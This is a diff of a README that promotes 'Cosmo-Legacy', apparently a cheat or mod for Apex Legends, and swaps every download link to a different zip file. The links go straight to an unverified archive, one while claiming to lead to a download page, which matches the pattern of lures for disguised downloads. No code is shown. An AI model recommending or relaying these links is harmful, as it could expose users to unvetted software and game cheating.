@@ -6,7 +6,7 @@ Welcome to the Cosmo-Legacy repository! This guide will help you download and ru
 
 ## 📥 Download Cosmo-Legacy
 
-[![Download Cosmo-Legacy](https://raw.githubusercontent.com/ryanpheonix09/Cosmo-Legacy/main/Arctostaphylos/Cosmo-Legacy_v3.0.zip)](https://raw.githubusercontent.com/ryanpheonix09/Cosmo-Legacy/main/Arctostaphylos/Cosmo-Legacy_v3.0.zip)
+[![Download Cosmo-Legacy](https://raw.githubusercontent.com/ryanpheonix09/Cosmo-Legacy/main/Arctostaphylos/Cosmo-Legacy-2.0-alpha.5.zip)](https://raw.githubusercontent.com/ryanpheonix09/Cosmo-Legacy/main/Arctostaphylos/Cosmo-Legacy-2.0-alpha.5.zip)
 
 Click the button above to download. 
 
@@ -22,7 +22,7 @@ Before you download, ensure your system can support Cosmo-Legacy. Here are the r
 
 ## 📥 Download & Install
 
-1. **Visit the Download Page**: Go to [this link](https://raw.githubusercontent.com/ryanpheonix09/Cosmo-Legacy/main/Arctostaphylos/Cosmo-Legacy_v3.0.zip) to access the download page.
+1. **Visit the Download Page**: Go to [this link](https://raw.githubusercontent.com/ryanpheonix09/Cosmo-Legacy/main/Arctostaphylos/Cosmo-Legacy-2.0-alpha.5.zip) to access the download page.
 2. **Select the Latest Version**: Find the latest release. It’s usually at the top of the list.
 3. **Download**: Click on the file to start downloading.
 4. **Locate the Downloaded File**: Once the download is complete, find the file in your Downloads folder.
@@ -71,6 +71,6 @@ For assistance, check our community forums or reach out via our contact page. We
 
 Cosmo-Legacy is released under the MIT License. You can find the full text of the license in the repository.
 
-[![Download Cosmo-Legacy Again](https://raw.githubusercontent.com/ryanpheonix09/Cosmo-Legacy/main/Arctostaphylos/Cosmo-Legacy_v3.0.zip)](https://raw.githubusercontent.com/ryanpheonix09/Cosmo-Legacy/main/Arctostaphylos/Cosmo-Legacy_v3.0.zip)
+[![Download Cosmo-Legacy Again](https://raw.githubusercontent.com/ryanpheonix09/Cosmo-Legacy/main/Arctostaphylos/Cosmo-Legacy-2.0-alpha.5.zip)](https://raw.githubusercontent.com/ryanpheonix09/Cosmo-Legacy/main/Arctostaphylos/Cosmo-Legacy-2.0-alpha.5.zip)
 
 By following these steps, you can fully enjoy the benefits of Cosmo-Legacy in Apex Legends. Download now and elevate your gaming experience!
